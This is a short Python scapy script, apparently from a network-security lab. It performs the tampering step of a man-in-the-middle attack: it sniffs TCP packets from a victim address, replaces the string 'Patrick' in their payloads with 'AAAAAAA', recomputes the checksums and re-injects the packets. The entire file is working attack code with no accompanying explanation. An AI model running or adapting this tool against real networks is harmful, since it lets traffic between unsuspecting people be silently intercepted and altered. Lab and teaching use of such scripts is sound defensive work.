#!/usr/bin/env python3
from fcntl import FASYNC
from time import sleep
from scapy.all import *


def spoof_pkt(pkt):
    # spoof the packet if sent from victim
    if pkt[IP].src == '10.9.0.5':
        new_pkt = IP(bytes(pkt[IP]))

        # remove checksum to ask scapy to calculate that again 
        del(new_pkt[TCP].payload)
        del(new_pkt[TCP].chksum)
        del(new_pkt.chksum)

        if pkt[TCP].payload:
            print('replacing')
            data = pkt[TCP].payload.load
            data = data.replace(b'Patrick', b'AAAAAAA')
            print(data)
            send(new_pkt/data, verbose=0)
        else:
            send(new_pkt, verbose=0)


if __name__ == '__main__':

    # use mac address
    pkt = sniff(iface='eth0', filter='tcp and not ether src 02:42:0a:09:00:6f', prn=spoof_pkt)

    # use ip address
    # pkt = sniff(iface='eth0', filter='tcp and not ip src 10.9.0.5', prn=spoof_pkt)